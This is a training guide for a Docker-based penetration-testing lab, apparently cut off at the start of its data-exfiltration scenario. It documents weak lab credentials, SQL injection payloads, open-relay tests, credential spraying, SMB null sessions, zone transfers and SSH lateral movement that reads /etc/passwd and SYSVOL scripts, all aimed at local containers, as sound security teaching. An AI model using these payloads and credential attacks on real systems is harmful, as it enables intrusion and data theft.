# CPTC11 Docker Lab Environment Training Guide

## Module Overview

This comprehensive training guide covers the Docker-based lab environment for the CPTC11 Security Framework. Upon completion, learners will understand how to deploy, configure, and utilize the containerized penetration testing environment for hands-on security training exercises.

**Learning Objectives:**
- Understand why Docker is ideal for penetration testing labs
- Master the CPTC11 network topology and service architecture
- Deploy and manage the complete testing environment
- Execute realistic attack scenarios against vulnerable services
- Customize and extend the lab environment

**Prerequisites:**
- Basic understanding of Linux command line
- Familiarity with networking concepts (TCP/IP, DNS, SMB)
- Docker and Docker Compose installed on host system
- Minimum 8GB RAM and 20GB disk space available

**Estimated Time:** 4-6 hours for complete module

---

## Part 1: Docker Fundamentals for Security Testing

### Why Docker for Penetration Testing Labs

Docker has revolutionized how security professionals build and maintain training environments. Traditional approaches to creating vulnerable lab environments required dedicated hardware, complex virtual machine configurations, and extensive time investment. Docker containers offer a compelling alternative that addresses these challenges while introducing capabilities that enhance the learning experience.

The containerization model provides several critical advantages for offensive security training. First, isolation ensures that vulnerable services cannot impact the host system or escape to production networks. Each container operates within its own namespace with restricted access to system resources, creating a natural security boundary that protects the underlying infrastructure. This isolation model allows instructors and learners to deploy intentionally vulnerable applications without risking compromise of development machines or adjacent systems.

Reproducibility stands as another significant benefit. Docker images capture the exact configuration of a vulnerable service, ensuring every learner encounters identical conditions. When a container is destroyed and recreated, it returns to its pristine vulnerable state without configuration drift or remnants from previous testing sessions. This consistency proves invaluable for structured training programs where assessment criteria depend on predictable system states.

Resource efficiency enables complex multi-host scenarios on modest hardware. Where virtual machines might require gigabytes of memory per instance, Docker containers share the host kernel and typically consume megabytes. The CPTC11 environment deploys over a dozen services simulating a complete enterprise network, yet runs comfortably on a standard development laptop. This efficiency democratizes access to sophisticated training environments that previously required expensive lab infrastructure.

The declarative configuration model embodied in Dockerfiles and Compose files serves an educational purpose beyond mere deployment. Learners can examine these configuration files to understand exactly how vulnerable services are configured, what weak settings enable exploitation, and how production hardening would differ. This transparency transforms the lab environment into a teaching tool that illuminates defensive as well as offensive techniques.

Rapid iteration accelerates the learning cycle. When a learner's testing corrupts a service or triggers a security control that locks an account, simply restarting the container restores functionality within seconds. This forgiveness encourages experimentation and reduces the frustration that can impede learning when environment recovery becomes a time-consuming distraction.

### Container Isolation and Networking

Docker provides multiple layers of isolation that enable safe operation of vulnerable services. Process isolation through Linux namespaces ensures that processes within a container cannot see or interact with processes in other containers or on the host. Filesystem isolation prevents containers from accessing host files except through explicitly defined volume mounts. Network isolation assigns each container to virtual networks with controlled connectivity.

The CPTC11 environment leverages Docker's networking capabilities to simulate realistic enterprise segmentation. Three distinct networks represent different security zones: a DMZ network for external-facing services, an internal network simulating the corporate LAN, and a management network with restricted access for administrative functions. Services attached to multiple networks model dual-homed systems that attackers often target as pivot points.

Docker's bridge network driver creates isolated Layer 2 segments where containers receive IP addresses from defined subnets. Inter-network traffic requires explicit routing or containers with interfaces on multiple networks. This architecture enables realistic scenarios where initial access to DMZ services must be leveraged to reach internal targets not directly accessible from the attacker's position.

Port mapping provides controlled exposure of container services to the host. The CPTC11 configuration exposes specific ports that map to container services, allowing tools running on the host to interact with lab targets. These mappings use non-standard ports to avoid conflicts with services potentially running on the host and to reinforce the distinction between lab and production environments.

### Security Considerations for Lab Environments

Operating intentionally vulnerable services demands careful attention to containment. The CPTC11 Docker environment implements multiple safeguards while acknowledging inherent risks that users must understand.

All services bind to localhost by default through Docker's port mapping configuration. External systems cannot directly reach lab services unless the operator explicitly modifies firewall rules or binding configurations. This default-deny approach prevents accidental exposure of vulnerable services to untrusted networks.

The management network employs Docker's internal network driver, which completely prevents external connectivity. Services on this network can only communicate with other containers, not with the host or external systems. This restriction protects sensitive administrative interfaces from any exposure.

Volume mounts follow the principle of least privilege. Read-only mounts prevent containers from modifying shared resources while still allowing access to wordlists and tools. Writable volumes for loot collection isolate exfiltrated data within the Docker storage subsystem rather than writing to host filesystems.

Despite these controls, operators must recognize that Docker isolation is not absolute. Kernel vulnerabilities could enable container escape, and misconfiguration could create unintended exposure paths. The environment should never operate on networks connected to production systems or sensitive data. Treat the lab as if successful compromise of any container could affect the host, because under certain conditions, it theoretically could.

Credential management within the lab deserves attention. Default passwords appear throughout configurations to enable testing. These credentials should never be reused for any purpose outside the lab environment. The exposure of weak passwords in configuration files serves an educational purpose but would constitute a severe vulnerability in production contexts.

---

## Part 2: CPTC11 Docker Architecture

### Network Topology Diagram

```
                                                  INTERNET
                                                      |
                                                      |
                        +-----------------------------+-----------------------------+
                        |                         HOST MACHINE                      |
                        |  (Ports: 8080, 8443, 2121, 2525, 587, 5353, 4445, etc.)  |
                        +-----------------------------+-----------------------------+
                                                      |
                       +------------------------------+------------------------------+
                       |                              |                              |
          +------------+------------+    +------------+------------+    +------------+------------+
          |    DMZ NETWORK          |    |   INTERNAL NETWORK      |    |  MANAGEMENT NETWORK     |
          |    10.10.10.0/24        |    |   10.10.20.0/24         |    |  10.10.30.0/24          |
          |    Gateway: 10.10.10.1  |    |   Gateway: 10.10.20.1   |    |  Gateway: 10.10.30.1    |
          +-------------------------+    +-------------------------+    |  (Internal Only)        |
          |                         |    |                         |    +-------------------------+
          | +---------------------+ |    | +---------------------+ |    |                         |
          | | vulnerable-web      | |    | | vulnerable-web      | |    | +---------------------+ |
          | | 10.10.10.10        +-------->| 10.10.20.10         | |    | | target-server-1     | |
          | | HTTP/HTTPS          | |    | | (Internal Access)   | |    | | 10.10.30.111        | |
          | +---------------------+ |    | +---------------------+ |    | | SSH Management      | |
          |                         |    |                         |    | +---------------------+ |
          | +---------------------+ |    | +---------------------+ |    |                         |
          | | ftp-server          | |    | | smb-server          | |    | +---------------------+ |
          | | 10.10.10.20         | |    | | 10.10.20.50         | |    | | target-dc           | |
          | | Port 21             | |    | | Ports 445, 139      | |    | | 10.10.30.5          | |
          | +---------------------+ |    | +---------------------+ |    | | LDAP/AD Management  | |
          |                         |    |                         |    | +---------------------+ |
          | +---------------------+ |    | +---------------------+ |    |                         |
          | | smtp-server         | |    | | smtp-server         | |    +-------------------------+
          | | 10.10.10.30        +-------->| 10.10.20.30         | |
          | | Ports 25, 587       | |    | | (Internal Mail)     | |
          | +---------------------+ |    | +---------------------+ |
          |                         |    |                         |
          | +---------------------+ |    | +---------------------+ |
          | | dns-server          | |    | | dns-server          | |
          | | 10.10.10.40        +-------->| 10.10.20.40         | |
          | | Port 53             | |    | | (Internal DNS)      | |
          | +---------------------+ |    | +---------------------+ |
          |                         |    |                         |
          | +---------------------+ |    | +---------------------+ |
          | | attack-platform     | |    | | attack-platform     | |
          | | 10.10.10.100       +-------->| 10.10.20.100        | |
          | | Attacker Station    | |    | | (Internal Access)   | |
          | +---------------------+ |    | +---------------------+ |
          |                         |    |                         |
          +-------------------------+    | +---------------------+ |
                                         | | mysql-server        | |
                                         | | 10.10.20.60         | |
                                         | | Port 3306           | |
                                         | +---------------------+ |
                                         |                         |
                                         | +---------------------+ |
                                         | | target-dc           | |
                                         | | 10.10.20.5          | |
                                         | | Domain Controller   | |
                                         | +---------------------+ |
                                         |                         |
                                         | +---------------------+ |
                                         | | target-workstation-1| |
                                         | | 10.10.20.101        | |
                                         | +---------------------+ |
                                         |                         |
                                         | +---------------------+ |
                                         | | target-workstation-2| |
                                         | | 10.10.20.102        | |
                                         | +---------------------+ |
                                         |                         |
                                         | +---------------------+ |
                                         | | target-server-1     | |
                                         | | 10.10.20.111        | |
                                         | | SSH Server          | |
                                         | +---------------------+ |
                                         |                         |
                                         +-------------------------+
```

### Container Inventory

| Container Name | Hostname | Role | Networks | Primary Purpose |
|----------------|----------|------|----------|-----------------|
| cptc11-vulnerable-web | vulnerable-web | Web Server | DMZ, Internal | SQL injection, directory enumeration, authentication testing |
| cptc11-ftp-server | ftp-server | FTP Server | DMZ | Credential validation, anonymous access testing |
| cptc11-smtp-server | smtp-server | Mail Server | DMZ, Internal | SMTP enumeration, relay testing, credential attacks |
| cptc11-dns-server | dns-server | DNS Server | DMZ, Internal | DNS enumeration, zone transfer attacks |
| cptc11-smb-server | smb-server | File Server | Internal | Share enumeration, null session testing |
| cptc11-mysql-server | mysql-server | Database | Internal | SQL attacks, credential testing |
| cptc11-dc | dc01 | Domain Controller | Internal, Management | AD enumeration, Kerberos attacks |
| cptc11-workstation-1 | ws01 | Workstation | Internal | Lateral movement target |
| cptc11-workstation-2 | ws02 | Workstation | Internal | Lateral movement target |
| cptc11-server-1 | srv01 | Linux Server | Internal, Management | SSH attacks, pivot point |
| cptc11-attack-platform | attacker | Attack Station | DMZ, Internal | Tool execution environment |

### Port Mappings and Service Exposure

| Host Port | Container | Container Port | Protocol | Service Description |
|-----------|-----------|----------------|----------|---------------------|
| 8080 | vulnerable-web | 80 | TCP | HTTP web application |
| 8443 | vulnerable-web | 443 | TCP | HTTPS web application |
| 2121 | ftp-server | 21 | TCP | FTP control channel |
| 30000-30009 | ftp-server | 30000-30009 | TCP | FTP passive data ports |
| 2525 | smtp-server | 25 | TCP | SMTP relay |
| 587 | smtp-server | 587 | TCP | SMTP submission |
| 5353 | dns-server | 53 | UDP/TCP | DNS queries |
| 4445 | smb-server | 445 | TCP | SMB/CIFS |
| 1139 | smb-server | 139 | TCP | NetBIOS Session |
| 3307 | mysql-server | 3306 | TCP | MySQL database |
| 2222 | target-server-1 | 22 | TCP | SSH access |

### Credential Documentation

**IMPORTANT:** These credentials are intentionally weak for testing purposes. Never reuse these credentials outside the lab environment.

#### Web Application Credentials
| Username | Password | Access Level | Notes |
|----------|----------|--------------|-------|
| admin | admin123 | Administrator | Full access to admin panel |
| user | password | Standard User | Basic application access |
| testuser | testpass | Standard User | Test account |
| webmaster | webmaster1 | Content Manager | CMS access |

#### FTP Server Credentials
| Username | Password | Home Directory | Notes |
|----------|----------|----------------|-------|
| ftpuser | ftppass123 | /home/ftpuser | Standard FTP user |
| admin | admin123 | /home/admin | Administrative access |
| backup | backup2024 | /home/backup | Backup service account |
| anonymous | (none) | /var/ftp/pub | Anonymous read access |

#### SMTP Server Credentials
| Username | Password | Access Level |
|----------|----------|--------------|
| smtpuser | smtppass123 | Authenticated relay |
| mailuser | mailpass456 | Mail submission |
| admin | admin123 | Administrative |

#### SMB Server Credentials
| Username | Password | Share Access |
|----------|----------|--------------|
| smbuser | smbpass123 | public, private, it, hr, finance |
| admin | admin123 | All shares including admin$ |
| backup | backup2024 | backup share |

#### MySQL Database Credentials
| Username | Password | Database Access |
|----------|----------|-----------------|
| root | rootpass123 | Full administrative |
| webuser | webpass123 | webapp database |
| dbadmin | dbadmin123 | webapp database |

#### Domain Controller / Server Credentials
| Username | Password | Role |
|----------|----------|------|
| Administrator | AdminPass123! | Domain Administrator |
| Domain_Admin | DomAdmin2024 | Domain Administrator |
| svc_backup | BackupSvc123 | Service Account |
| svc_sql | SqlSvc2024! | Service Account |
| admin | admin123 | SSH access (srv01) |
| sysadmin | sysadmin1 | SSH access (srv01) |

---

## Part 3: Service-by-Service Deep Dive

### Vulnerable Web Application

**Container:** cptc11-vulnerable-web
**IP Addresses:** 10.10.10.10 (DMZ), 10.10.20.10 (Internal)
**Exposed Ports:** 8080 (HTTP), 8443 (HTTPS)

#### Architecture Overview

The vulnerable web application runs on Apache with PHP, providing a realistic attack surface for web security testing. The application connects to a MySQL backend database and includes several intentionally vulnerable features.

```
+-------------------+     +-------------------+     +-------------------+
|   Web Browser     |---->|   Apache/PHP      |---->|   MySQL Server    |
|   (Attacker)      |     |   vulnerable-web  |     |   10.10.20.60     |
+-------------------+     +-------------------+     +-------------------+
                                    |
                          +---------+---------+
                          |         |         |
                       /login   /admin    /api
                          |         |         |
                       Auth      Admin     API
                       Form      Panel    Endpoints
```

#### Embedded Vulnerabilities

1. **SQL Injection:** The login form and API endpoints do not properly sanitize user input, enabling classic SQL injection attacks.

2. **Hardcoded Credentials:** Login credentials are stored in plaintext within the PHP source code, discoverable through source code exposure.

3. **Information Disclosure:** Debug mode is enabled, causing verbose error messages that reveal internal paths and configuration details.

4. **Directory Listing:** Apache directory indexing is enabled on certain paths, allowing enumeration of files.

5. **Backup File Exposure:** A database configuration backup file (`database.php.bak`) is accessible and contains database credentials.

6. **robots.txt Disclosure:** The robots.txt file reveals hidden administrative directories intended to be "hidden" from search engines.

#### Testing Scenarios

**Scenario: Directory Enumeration**
```bash
# From host machine
python /Users/ic/cptc11/python/tools/web-directory-enumerator/tool.py http://localhost:8080 -v

# Common directories to find:
# /admin/    - Administrative panel
# /api/      - API endpoints
# /config/   - Configuration files
# /robots.txt - Disallowed paths listing
```

**Scenario: Credential Discovery via Backup File**
```bash
# Access the exposed backup file
curl http://localhost:8080/config/database.php.bak

# Expected output reveals MySQL credentials
```

**Scenario: Authentication Bypass**
```bash
# Test form-based login with discovered credentials
curl -X POST http://localhost:8080/login.php \
  -d "username=admin&password=admin123"
```

### FTP Server

**Container:** cptc11-ftp-server
**IP Address:** 10.10.10.20 (DMZ)
**Exposed Port:** 2121

#### Configuration Details

The FTP server runs vsftpd with intentionally permissive settings designed to demonstrate common FTP misconfigurations. Key security weaknesses include:

- Anonymous FTP access enabled with readable public directory
- Multiple user accounts with weak passwords
- No encryption required for authentication
- Passive mode configured for containerized operation

#### Directory Structure

```
/var/ftp/pub/           # Anonymous accessible
    welcome.txt         # Public information file

/home/ftpuser/files/    # ftpuser home directory
    readme.txt

/home/admin/private/    # admin home directory
    secret.txt          # Sensitive data

/home/backup/archives/  # backup user directory
    manifest.txt        # Backup metadata
```

#### Attack Vectors

1. **Anonymous Access Enumeration:** Connect without credentials to enumerate public files and gather information about the organization.

2. **Credential Brute Force:** Test common username/password combinations against authenticated users.

3. **User Enumeration:** Certain FTP responses differ based on whether a username exists, enabling user discovery.

4. **Sensitive File Access:** Authenticated users may access files outside their intended scope depending on vsftpd configuration.

#### Testing Commands

```bash
# Test anonymous access
ftp localhost 2121
# Login: anonymous
# Password: (any email or blank)

# Using CPTC11 credential validator
python /Users/ic/cptc11/python/tools/credential-validator/tool.py \
  localhost --protocol ftp --port 2121 \
  -u ftpuser -P ftppass123

# Brute force simulation
python /Users/ic/cptc11/python/tools/credential-validator/tool.py \
  localhost --protocol ftp --port 2121 \
  --userlist /path/to/users.txt --passlist /path/to/passwords.txt
```

### SMTP Server

**Container:** cptc11-smtp-server
**IP Addresses:** 10.10.10.30 (DMZ), 10.10.20.30 (Internal)
**Exposed Ports:** 2525 (SMTP), 587 (Submission)

#### Postfix Configuration Weaknesses

The SMTP server runs Postfix with deliberately insecure settings that represent common misconfigurations found in enterprise environments:

- VRFY command enabled (user enumeration)
- No HELO/EHLO restrictions
- Permissive relay configuration for internal networks
- SASL authentication with weak credentials
- TLS optional, not required

#### Enumeration Techniques

**VRFY User Enumeration:**
```bash
nc localhost 2525
VRFY admin
# 252 2.0.0 admin
VRFY nonexistent
# 550 5.1.1 <nonexistent>: Recipient address rejected
```

**EXPN Mailing List Expansion:**
```bash
nc localhost 2525
EXPN postmaster
```

**RCPT TO Enumeration:**
```bash
nc localhost 2525
HELO test
MAIL FROM:<test@test.com>
RCPT TO:<admin@testlab.local>
# 250 OK indicates valid recipient
```

#### Relay Testing

```bash
# Test open relay (should succeed from internal networks)
nc localhost 2525
HELO attacker
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>
DATA
Subject: Relay Test
Test message
.
```

### DNS Server

**Container:** cptc11-dns-server
**IP Addresses:** 10.10.10.40 (DMZ), 10.10.20.40 (Internal)
**Exposed Port:** 5353 (UDP/TCP)

#### Zone Configuration

The DNS server provides authoritative responses for the `testlab.local` domain with an extensive zone file containing numerous discoverable records:

**Key Record Categories:**
- **Web Infrastructure:** www, web, portal, app, api
- **Mail Servers:** mail, mail2, smtp, webmail
- **Development Systems:** dev, staging, test, qa, uat
- **Database Servers:** db, mysql, postgres, mongodb, redis
- **Domain Controllers:** dc01, dc02, ldap, kerberos
- **Legacy Systems:** legacy, old, deprecated

#### Enumeration Techniques

**Standard DNS Queries:**
```bash
# Query specific record
dig @localhost -p 5353 www.testlab.local

# Query mail servers
dig @localhost -p 5353 testlab.local MX

# Query name servers
dig @localhost -p 5353 testlab.local NS
```

**Zone Transfer Attack:**
```bash
# Attempt AXFR zone transfer (intentionally enabled)
dig @localhost -p 5353 testlab.local AXFR

# Using CPTC11 DNS enumerator
python /Users/ic/cptc11/python/tools/dns-enumerator/tool.py \
  testlab.local -n 127.0.0.1:5353 -z -v
```

**Subdomain Brute Force:**
```bash
python /Users/ic/cptc11/python/tools/dns-enumerator/tool.py \
  testlab.local -n 127.0.0.1:5353 \
  --wordlist /root/wordlists/subdomains-top5000.txt
```

### SMB Server

**Container:** cptc11-smb-server
**IP Address:** 10.10.20.50 (Internal)
**Exposed Ports:** 4445 (SMB), 1139 (NetBIOS)

#### Share Configuration

The SMB server runs Samba with multiple shares demonstrating various access control configurations:

| Share Name | Access Type | Description |
|------------|-------------|-------------|
| public | Anonymous Read | General files, guest accessible |
| private | Authenticated | Restricted to smbuser, admin |
| backup | Authenticated | Backup archives, sensitive data |
| it | Authenticated | IT department files |
| hr | Authenticated | HR department files |
| finance | Authenticated | Finance department files |
| admin$ | Hidden, Admin | Administrative share |
| C$ | Hidden, Admin | Root filesystem share |

#### Null Session Configuration

The server intentionally allows null sessions with `restrict anonymous = 0`, enabling:
- Share enumeration without authentication
- User enumeration through RPC
- Basic system information disclosure

#### Enumeration Commands

```bash
# Null session share enumeration
smbclient -L //localhost -p 4445 -N

# Using CPTC11 SMB enumerator
python /Users/ic/cptc11/python/tools/smb-enumerator/tool.py \
  localhost --port 4445 --plan

python /Users/ic/cptc11/python/tools/smb-enumerator/tool.py \
  localhost --port 4445 -v

# Authenticated enumeration
smbclient //localhost/private -p 4445 -U smbuser%smbpass123

# Access public share
smbclient //localhost/public -p 4445 -N
```

### MySQL Server

**Container:** cptc11-mysql-server
**IP Address:** 10.10.20.60 (Internal)
**Exposed Port:** 3307

#### Database Structure

**Database:** webapp

| Table | Purpose | Sensitive Data |
|-------|---------|----------------|
| users | Application users | Plaintext passwords |
| sessions | User sessions | Session tokens |
| products | Demo data | None |
| config | Application config | API keys, encryption keys |
| logs | Access logs | IP addresses |

#### Credential Testing

```bash
# Connect with discovered credentials
mysql -h localhost -P 3307 -u webuser -pwebpass123 webapp

# Test root access
mysql -h localhost -P 3307 -u root -prootpass123

# Query sensitive data
SELECT * FROM users;
SELECT * FROM config WHERE is_secret = TRUE;
```

#### SQL Injection Targets

The web application's database connection enables SQL injection testing:

```sql
-- Authentication bypass
' OR '1'='1' --

-- Data extraction
' UNION SELECT username, password, email, role, created_at FROM users --

-- Enumerate tables
' UNION SELECT table_name, NULL, NULL, NULL, NULL FROM information_schema.tables --
```

### Domain Controller

**Container:** cptc11-dc
**IP Addresses:** 10.10.20.5 (Internal), 10.10.30.5 (Management)

#### AD Simulation Components

The domain controller container simulates key Active Directory services:

- **LDAP (Port 389/636):** OpenLDAP providing directory services
- **Kerberos (Port 88):** Simulated Kerberos authentication
- **SMB (Port 445):** Samba domain controller mode
- **SSH (Port 22):** Administrative access

#### User Accounts

| Account | Type | Password |
|---------|------|----------|
| Administrator | Domain Admin | AdminPass123! |
| Domain_Admin | Domain Admin | DomAdmin2024 |
| svc_backup | Service Account | BackupSvc123 |
| svc_sql | Service Account | SqlSvc2024! |
| helpdesk | Standard User | Help123! |

#### Enumeration Targets

```bash
# LDAP enumeration
ldapsearch -x -h localhost -p 389 -b "dc=testlab,dc=local"

# User enumeration via RPC (from attack platform)
rpcclient -U "" -N 10.10.20.5
> enumdomusers
> enumdomgroups

# Kerberos user enumeration
kerbrute userenum -d testlab.local --dc 10.10.20.5 userlist.txt
```

### Workstations

**Containers:** cptc11-workstation-1, cptc11-workstation-2
**IP Addresses:** 10.10.20.101, 10.10.20.102 (Internal)

#### Configuration

The workstation containers simulate Windows endpoints on the corporate network. While running Alpine Linux, they provide:

- SSH service for remote access testing
- Network presence for reconnaissance
- Lateral movement targets from compromised systems

#### Testing Approach

Workstations serve as secondary targets during lateral movement exercises:

1. Discover workstations through network scanning
2. Identify running services
3. Attempt credential reuse from previously compromised systems
4. Establish persistence once accessed

---

## Part 4: Lab Setup Walkthrough

### Prerequisites

Before deploying the CPTC11 Docker environment, ensure your system meets the following requirements:

**Software Requirements:**
- Docker Engine 20.10 or later
- Docker Compose v2.0 or later
- 8GB RAM minimum (16GB recommended)
- 20GB available disk space
- Linux, macOS, or Windows with WSL2

**Verification Commands:**
```bash
# Check Docker version
docker --version
# Expected: Docker version 20.10.x or later

# Check Docker Compose version
docker compose version
# Expected: Docker Compose version v2.x.x

# Verify Docker daemon is running
docker info
```

### Building Containers

Navigate to the Docker directory and build all container images:

```bash
# Change to Docker directory
cd /Users/ic/cptc11/docker

# Build all images (first run may take 10-15 minutes)
docker compose build

# Build specific service if needed
docker compose build vulnerable-web

# Build without cache (for troubleshooting)
docker compose build --no-cache
```

**Expected Output:**
```
[+] Building 45.2s (15/15) FINISHED
 => [vulnerable-web internal] load build definition from Dockerfile
 => [ftp-server internal] load build definition from Dockerfile
 => [smtp-server internal] load build definition from Dockerfile
...
```

### Starting the Environment

Launch all services in detached mode:

```bash
# Start all containers
docker compose up -d

# Expected output shows all services starting
[+] Running 12/12
 ✔ Network docker_dmz_network        Created
 ✔ Network docker_internal_network   Created
 ✔ Network docker_management_network Created
 ✔ Container cptc11-mysql-server     Started
 ✔ Container cptc11-dns-server       Started
 ...
```

### Verifying Services

Confirm all containers are running and healthy:

```bash
# List running containers
docker compose ps

# Expected output:
NAME                      STATUS              PORTS
cptc11-attack-platform    running
cptc11-dc                 running
cptc11-dns-server         running (healthy)   5353->53/tcp, 5353->53/udp
cptc11-ftp-server         running (healthy)   2121->21/tcp, 30000-30009->30000-30009/tcp
cptc11-mysql-server       running (healthy)   3307->3306/tcp
cptc11-server-1           running             2222->22/tcp
cptc11-smb-server         running (healthy)   4445->445/tcp, 1139->139/tcp
cptc11-smtp-server        running (healthy)   2525->25/tcp, 587->587/tcp
cptc11-vulnerable-web     running (healthy)   8080->80/tcp, 8443->443/tcp
cptc11-workstation-1      running
cptc11-workstation-2      running
```

**Service Health Verification:**
```bash
# Test web application
curl -s http://localhost:8080/health
# Expected: "ok" or HTTP 200

# Test FTP
nc -zv localhost 2121
# Expected: Connection succeeded

# Test DNS
dig @localhost -p 5353 testlab.local
# Expected: DNS response with A record

# Test SMB
smbclient -L //localhost -p 4445 -N
# Expected: Share listing

# Test MySQL
mysql -h localhost -P 3307 -u webuser -pwebpass123 -e "SELECT 1"
# Expected: Query result
```

### Accessing the Attack Platform

The attack platform container provides a pre-configured environment for running attacks:

```bash
# Access attack platform shell
docker exec -it cptc11-attack-platform bash

# Inside the container:
attacker@cptc11:/root#

# Verify network connectivity to targets
ping -c 1 10.10.10.10  # vulnerable-web (DMZ)
ping -c 1 10.10.20.50  # smb-server (Internal)

# Access CPTC11 tools
cd /opt/tools/tools
ls
# dns-enumerator  port-scanner  smb-enumerator  ...
```

### Troubleshooting Common Issues

#### Container Fails to Start

**Symptom:** Container exits immediately after starting

**Diagnosis:**
```bash
# Check container logs
docker compose logs vulnerable-web

# Check for port conflicts
lsof -i :8080
netstat -tulpn | grep 8080
```

**Resolution:**
- Stop conflicting services or modify port mappings in docker-compose.yml
- Rebuild container: `docker compose build --no-cache <service>`

#### Network Connectivity Issues

**Symptom:** Containers cannot communicate with each other

**Diagnosis:**
```bash
# Verify networks exist
docker network ls | grep cptc11

# Inspect network configuration
docker network inspect docker_dmz_network

# Test from attack platform
docker exec -it cptc11-attack-platform ping 10.10.10.10
```

**Resolution:**
- Recreate networks: `docker compose down && docker compose up -d`
- Check for conflicting Docker networks: `docker network prune`

#### DNS Resolution Failures

**Symptom:** DNS queries return no results or timeouts

**Diagnosis:**
```bash
# Check DNS container logs
docker compose logs dns-server

# Verify BIND is running
docker exec cptc11-dns-server ps aux | grep named
```

**Resolution:**
- Restart DNS container: `docker compose restart dns-server`
- Verify zone file syntax in `dns-server/config/zones/`

#### Database Connection Refused

**Symptom:** Cannot connect to MySQL on port 3307

**Diagnosis:**
```bash
# Check MySQL container status
docker compose logs mysql-server

# Verify MySQL is accepting connections
docker exec cptc11-mysql-server mysqladmin ping
```

**Resolution:**
- Wait for MySQL initialization (first start takes 30-60 seconds)
- Check MySQL data volume: `docker volume ls | grep mysql`
- Reset database: `docker compose down -v && docker compose up -d mysql-server`

### Stopping and Resetting

```bash
# Stop all containers (preserves data)
docker compose stop

# Start stopped containers
docker compose start

# Stop and remove containers (preserves volumes)
docker compose down

# Full reset - removes containers and all data
docker compose down -v

# Remove unused images
docker image prune -f
```

---

## Part 5: Attack Scenarios

### Scenario 1: Reconnaissance Workflow

**Objective:** Perform comprehensive reconnaissance to map the target environment and identify attack surface.

**Difficulty:** Level 1 (Foundation)

**Time Estimate:** 30-45 minutes

#### Phase 1: Network Discovery

```bash
# From attack platform
docker exec -it cptc11-attack-platform bash

# Discover live hosts in DMZ
nmap -sn 10.10.10.0/24

# Expected results:
# 10.10.10.1   - Gateway
# 10.10.10.10  - vulnerable-web
# 10.10.10.20  - ftp-server
# 10.10.10.30  - smtp-server
# 10.10.10.40  - dns-server
# 10.10.10.100 - attack-platform (us)
```

#### Phase 2: Service Enumeration

```bash
# Port scan discovered hosts
nmap -sV -sC 10.10.10.10 10.10.10.20 10.10.10.30 10.10.10.40

# Detailed scan of web server
nmap -sV -p 80,443,8080,8443 10.10.10.10
```

#### Phase 3: DNS Intelligence

```bash
# Enumerate DNS records
cd /opt/tools/tools/dns-enumerator
python tool.py testlab.local -n 10.10.10.40 -v

# Attempt zone transfer
python tool.py testlab.local -n 10.10.10.40 -z

# Review discovered hosts and plan internal reconnaissance
```

#### Phase 4: Web Application Fingerprinting

```bash
# Directory enumeration
cd /opt/tools/tools/web-directory-enumerator
python tool.py http://10.10.10.10 -v

# Check robots.txt
curl http://10.10.10.10/robots.txt

# Identify technologies
curl -I http://10.10.10.10
```

#### Validation Criteria

- [ ] Identified all live hosts in DMZ network
- [ ] Enumerated services on each host
- [ ] Performed successful zone transfer
- [ ] Discovered hidden directories on web application
- [ ] Documented findings for next phase

---

### Scenario 2: Credential Spraying

**Objective:** Use discovered information to validate credentials across multiple services.

**Difficulty:** Level 2 (Application)

**Time Estimate:** 45-60 minutes

#### Phase 1: Build Credential Lists

Based on reconnaissance, compile username and password lists:

```bash
# Create username list
cat << 'EOF' > /root/users.txt
admin
administrator
ftpuser
smbuser
backup
webuser
root
testuser
EOF

# Create password list
cat << 'EOF' > /root/passwords.txt
admin123
password
ftppass123
smbpass123
backup2024
webpass123
rootpass123
testpass
Admin123
Password1
EOF
```

#### Phase 2: FTP Credential Testing

```bash
cd /opt/tools/tools/credential-validator

# Test single credential
python tool.py 10.10.10.20 --protocol ftp --port 21 \
  -u ftpuser -P ftppass123

# Spray credentials
python tool.py 10.10.10.20 --protocol ftp --port 21 \
  --userlist /root/users.txt --passlist /root/passwords.txt
```

#### Phase 3: SMB Credential Testing

```bash
# Test null session
smbclient -L //10.10.20.50 -N

# Test known credentials
cd /opt/tools/tools/smb-enumerator
python tool.py 10.10.20.50 -u smbuser -p smbpass123

# Enumerate shares with valid credentials
smbclient //10.10.20.50/private -U smbuser%smbpass123 -c "dir"
```

#### Phase 4: SSH Credential Testing

```bash
# Test SSH on server
ssh -o StrictHostKeyChecking=no admin@10.10.20.111 -p 22

# Password: admin123 (should succeed)
```

#### Phase 5: Database Credential Testing

```bash
# Test MySQL credentials
mysql -h 10.10.20.60 -u webuser -pwebpass123 -e "SHOW DATABASES;"

# Attempt root access
mysql -h 10.10.20.60 -u root -prootpass123 -e "SELECT user, host FROM mysql.user;"
```

#### Validation Criteria

- [ ] Successfully authenticated to FTP with at least 2 accounts
- [ ] Enumerated SMB shares using null session
- [ ] Accessed private SMB shares with credentials
- [ ] Established SSH session to target server
- [ ] Connected to MySQL database
- [ ] Documented all valid credential pairs

---

### Scenario 3: Lateral Movement Exercise

**Objective:** Starting from initial access on the attack platform, move laterally through the network to reach high-value targets.

**Difficulty:** Level 3 (Integration)

**Time Estimate:** 60-90 minutes

#### Initial Position

You have access to the attack platform with connectivity to both DMZ and internal networks. Your goal is to reach the domain controller and extract sensitive information.

#### Phase 1: Establish Foothold

```bash
# Access attack platform
docker exec -it cptc11-attack-platform bash

# Verify current position
hostname
ip addr show
```

#### Phase 2: Move to Internal Server

```bash
# Using credentials discovered in Scenario 2
ssh admin@10.10.20.111

# Once connected, enumerate local system
whoami
id
cat /etc/passwd
```

#### Phase 3: Pivot Through File Server

```bash
# From compromised server, access SMB shares
smbclient //10.10.20.50/backup -U backup%backup2024

# Look for credentials or sensitive data
smb: \> dir
smb: \> get manifest.txt
```

#### Phase 4: Target Domain Controller

```bash
# Enumerate domain controller
ldapsearch -x -h 10.10.20.5 -b "dc=testlab,dc=local" "(objectClass=*)"

# Access DC via SSH (using service account)
ssh svc_backup@10.10.20.5
# Password: BackupSvc123
```

#### Phase 5: Extract Domain Information

```bash
# On DC, enumerate users
cat /opt/ad/users.txt

# Access SYSVOL
ls -la /var/lib/samba/sysvol/testlab.local/

# Extract scripts (may contain credentials)
cat /var/lib/samba/sysvol/testlab.local/scripts/logon.bat
```

#### Validation Criteria

- [ ] Established SSH session to target-server-1
- [ ] Accessed backup share on SMB server
- [ ] Connected to domain controller
- [ ] Extracted user list from DC
- [ ] Documented complete attack path

---

### Scenario 4: Data Exfiltration

**Objective:** Identify and exfiltrate sensitive data from the compromised environment.

**Difficulty:** Level 3 (Integration)

**Time Estimate:** 45-60 minutes

#### Phase 1: Identify Sensitive Data Locations

Based on previous reconnaissance:
- MySQL database contains user credentials and API keys
- SMB backup share contains archives
- Web server config files contain database credentials
